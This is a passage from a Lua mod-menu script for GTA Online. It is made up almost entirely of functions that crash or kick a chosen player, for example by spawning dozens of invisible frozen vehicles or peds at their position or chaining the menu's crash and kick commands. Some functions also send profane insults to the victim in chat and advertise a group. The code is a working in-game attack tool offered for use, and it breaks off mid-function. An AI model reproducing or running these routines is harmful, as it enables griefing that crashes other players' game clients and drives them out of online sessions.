    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb7, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb8, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb9, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb10, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb11 ,TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    util.yield(10)
end
util.yield(5500)
entities.delete_by_handle(Object_jb1)
entities.delete_by_handle(Object_jb2)
entities.delete_by_handle(Object_jb3)
entities.delete_by_handle(Object_jb4)
entities.delete_by_handle(Object_jb5)
entities.delete_by_handle(Object_jb6)
entities.delete_by_handle(Object_jb7)
entities.delete_by_handle(Object_jb8)
entities.delete_by_handle(Object_jb9)
entities.delete_by_handle(Object_jb10)
entities.delete_by_handle(Object_jb11)
end

--导弹车崩溃V1
function daodanchev1(PlayerID)
    menu.trigger_commands("anticrashcam on")
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            SpawnedVehicleList = { };
            for i = 1, 80 do
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                SpawnedVehicleList[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
                ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
                util.yield(50)
            end
            util.yield(5000)
            for i = 1, 80 do
                entities.delete_by_handle(SpawnedVehicleList[i])
            end
            menu.trigger_commands("anticrashcam off")
            end

    --导弹车崩溃V2
    function daodanchev2(PlayerID)
    menu.trigger_commands("anticrashcam on")
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            TargetPlayerPos.y = TargetPlayerPos.y + 1050
            SpawnedVehicleList1 = { };
            for i = 1, 60 do
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                SpawnedVehicleList1[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
                ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList1[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList1[i], false, 0)
                util.yield(50)
            end
            util.yield(2000)
            for i = 1, 60 do
                entities.delete_by_handle(SpawnedVehicleList1[i])
            end
    
            util.yield(1000)
            SpawnedVehicleList2 = { };
            for i = 1, 50 do
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                SpawnedVehicleList2[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
                ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList2[i], true)
                ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList2[i], false, 0)
                util.yield(50)
            end
            util.yield(2000)
            for i = 1, 50 do
                entities.delete_by_handle(SpawnedVehicleList2[i])
            end
            menu.trigger_commands("anticrashcam off")
        end

        --无效外观V1
        function BadOutfitCrashV1(PlayerID)
            menu.trigger_commands("anticrashcam on")
            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
            local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            for i = 0, 500 do
                PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
                ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
                util.yield(10)
            end
            entities.delete_by_handle(Spawned_Mike)
            menu.trigger_commands("anticrashcam off")
        end

        function RqModel (hash)
            STREAMING.REQUEST_MODEL(hash)
            local count = 0
            notification("正在请求模型...")
            while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
                STREAMING.REQUEST_MODEL(hash)
                count = count + 1
                util.yield(10)
            end
            if not STREAMING.HAS_MODEL_LOADED(hash) then
                notification("已尝试1秒,无法加载此指定模型!")
            end
        end

        --无效外观V2
function BadOutfitCrashV2(PlayerID)
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(PlayerID))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(PlayerID))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    wait(2000)
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end

---单崩黄昏
function dhcrash(PlayerID)
    for pedp_crash = 2 , 6 do
    pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    dune = CreateVehicle(410882957,pos,ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune, true)
    dune1 = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune1, true)
    barracks = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
    barracks1 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks1, true)
    dunecar = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar, true)
    dunecar1 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar1, true)
    dunecar2 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar2, true)
    barracks3 = CreateVehicle(4244420235,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
    barracks31 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks31, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar2, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar, pedp, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    util.yield(5000)
    for i = 0, 100  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dunecar, pos.x, pos.y, pos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(dune)
        entities.delete_by_handle(dune1)
        entities.delete_by_handle(barracks)
        entities.delete_by_handle(barracks1)
        entities.delete_by_handle(dunecar)
        entities.delete_by_handle(dunecar1)
        entities.delete_by_handle(dunecar2)
        entities.delete_by_handle(barracks3)
        entities.delete_by_handle(barracks31)
    end
end
function OXcrashgg(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    
    local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
    ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
    util.yield(100)
    WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
    util.yield(1000)
    FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        
    util.yield(10000)
    
    entities.delete_by_handle(PED1)
    
        
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_fabien模型",colors.red)
        local PED2 = CreatePed(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(5000)
    
        entities.delete_by_handle(PED2)
        end
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_manuel模型",colors.red)
        local PED3 = CreatePed(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(5000)
    
        entities.delete_by_handle(PED3)
        end
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_taostranslator模型",colors.red)
        local PED4 = CreatePed(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(5000)
    
        entities.delete_by_handle(PED4)
        end
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_taostranslator2模型",colors.red)
        local PED5 = CreatePed(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(5000)
    
        entities.delete_by_handle(PED5)
        end
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_tenniscoach模型",colors.red)
        local PED6 = CreatePed(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(5000)
    
            entities.delete_by_handle(PED6)
        end
    if players.exists(PlayerID) then
        notification("未能移除玩家,正在使用cs_wade模型",colors.red)
        local PED7 = CreatePed(26,util.joaat("cs_wade"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(5000)
    
        entities.delete_by_handle(PED7)
        end
    if not players.exists(PlayerID) then
        notification("成功移除玩家",colors.red)
    end
end

function OXcrashggv2(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    
    local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
    ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
    util.yield(100)
    WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
    util.yield(1000)
    FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        
    util.yield(1000)
    
    entities.delete_by_handle(PED1)
        
    if players.exists(PlayerID) then
        local PED2 = CreatePed(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(1000)
    
        entities.delete_by_handle(PED2)
        end
    if players.exists(PlayerID) then
        local PED3 = CreatePed(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(1000)
    
        entities.delete_by_handle(PED3)
        end
    if players.exists(PlayerID) then
        local PED4 = CreatePed(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(1000)
    
        entities.delete_by_handle(PED4)
        end
    if players.exists(PlayerID) then
        local PED5 = CreatePed(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(1000)
    
        entities.delete_by_handle(PED5)
        end
    if players.exists(PlayerID) then
        local PED6 = CreatePed(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(1000)
    
            entities.delete_by_handle(PED6)
        end
    if players.exists(PlayerID) then
        local PED7 = CreatePed(26,util.joaat("cs_wade"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
        util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
        util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    
        util.yield(1000)
    
        entities.delete_by_handle(PED7)
        end
    if not players.exists(PlayerID) then
        notification("成功移除玩家",colors.blue)
    end
end

--改进露娜崩溃
function lunacrash(PlayerID)
    fishmm = state
    local TargetPPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPPos = ENTITY.GET_ENTITY_COORDS(TargetPPed)
    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1992.8982, -780.7021, -0.37660158, false, false, false, false)
    menu.trigger_commands("levitatepassivemax 0")
    menu.trigger_commands("levitateassistup 0")
    menu.trigger_commands("levitateassistdown 0")
    menu.trigger_commands("noguns")
    menu.trigger_commands("invisibility on")
    util.yield(1000)
    menu.trigger_commands("acfish")
    util.yield(100)
    menu.trigger_commands(" on")
    util.yield(100)
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1813897027,15,true,true)
    util.yield(100)
    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),TargetPPos.x,TargetPPos.y,TargetPPos.z, false, false, false, false)
    util.yield(100)
util.yield(9000)
if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
    menu.trigger_commands("mpmale")
else
    menu.trigger_commands("mpfemale")
end
menu.trigger_commands("levitatepassivemax 0.6")
menu.trigger_commands("levitateassistup 0.6")
menu.trigger_commands("levitateassistdown 0.6")
menu.trigger_commands("levitate off")
menu.trigger_commands("noguns")
menu.trigger_commands("invisibility off")
notification("搞定",colors.red)
while fishmm do
    util.yield()
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 25, 1)
end
end
---拖车崩
function tuocheb(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    SpawnedDune1 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
    SpawnedDune2 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
    SpawnedBarracks1 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
    SpawnedBarracks2 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
    SpawnedTowtruck = CreateVehicle(util.joaat("towtruck2"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
    SpawnedBarracks31 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
    SpawnedBarracks32 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    for i = 0, 100 do 
        TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        util.yield(10)
    end
    util.yield(2000)
    entities.delete_by_handle(SpawnedTowtruck)
    entities.delete_by_handle(SpawnedDune1)
    entities.delete_by_handle(SpawnedDune2)
    entities.delete_by_handle(SpawnedBarracks31)
    entities.delete_by_handle(SpawnedBarracks32)
    entities.delete_by_handle(SpawnedBarracks1)
    entities.delete_by_handle(SpawnedBarracks2)
end

---鬼崩
function guibeng(PlayerID)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    local Spawned_tr3 = CreateVehicle(util.joaat("tr3"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_tr3, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_tr3, false, 0)
    local Spawned_chernobog = CreateVehicle(util.joaat("chernobog"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_chernobog, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_chernobog, false, 0)
    local Spawned_avenger = CreateVehicle(util.joaat("avenger"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_avenger, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_avenger, false, 0)
    for i = 0, 100 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false)
        util.yield(10 * math.random())
        ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, true, false, false)
        util.yield(10 * math.random())
    end
    menu.trigger_commands("anticrashcam off")
end
---猎杀者
function huntercrash(PlayerID)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnedVehicleList = { };
    for i = 1, 60 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        SpawnedVehicleList[i] = CreateVehicle(util.joaat("hunter"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
        ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
        util.yield(50)
    end
    util.yield(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnedVehicleList[i])
    end
    menu.trigger_commands("anticrashcam off")
end
--橙子口嗨崩溃
function orangescrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 臭傻逼回桌面见见你橙子大爹吧",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("hiroshima " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("nature " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
        else
            if players.exists(PlayerID) then
            menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
            util.yield(3000)
            end
            if players.exists(PlayerID) then
            menu.trigger_commands("hiroshima " .. players.get_name(PlayerID))
            util.yield(3000)
            end
            if players.exists(PlayerID) then
            menu.trigger_commands("nature " .. players.get_name(PlayerID))
            end
            util.yield(8000) 
            if players.exists(PlayerID) then
            util.toast("再等会")
            util.yield(2000)
            menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
            util.yield(2500)
           util.toast("成功移除此玩家")
        end
    end
end

function colacrash(PlayerID)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 臭傻逼回桌面喝可乐吧",false,true,true)
    if players.exists(PlayerID) then
        menu.trigger_commands("nicecrash " .. players.get_name(PlayerID) .. " 2")
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("inshell " .. players.get_name(PlayerID))
        util.yield(3000)
    end
    if players.exists(PlayerID) then
        menu.trigger_commands("grief " .. players.get_name(PlayerID))
    end
        util.yield(8000) 
    if players.exists(PlayerID) then
        util.toast("再等会")
        util.yield(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
        util.yield(2500)
        util.toast("成功移除此玩家")
    end
        else
            if players.exists(PlayerID) then
            menu.trigger_commands("nicecrash " .. players.get_name(PlayerID) .. " 2")
            util.yield(3000)
            end
            if players.exists(PlayerID) then
            menu.trigger_commands("inshell " .. players.get_name(PlayerID))
            util.yield(3000)
            end
            if players.exists(PlayerID) then
            menu.trigger_commands("grief " .. players.get_name(PlayerID))
            end
            util.yield(8000) 
            if players.exists(PlayerID) then
            util.toast("再等会")
            util.yield(2000)
            menu.trigger_commands("adaptivekick " .. players.get_name(PlayerID))
            util.yield(2500)
           util.toast("成功移除此玩家")
        end
    end
end

function cookiecrash(PlayerID)
    if toxicchatincrash then
        chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(PlayerID) .." 草泥马了，还玩线上呢，能不能进群644158934找饼哥拿科技",false,true,true)
        if players.exists(PlayerID) then
            menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
            util.yield(3000)
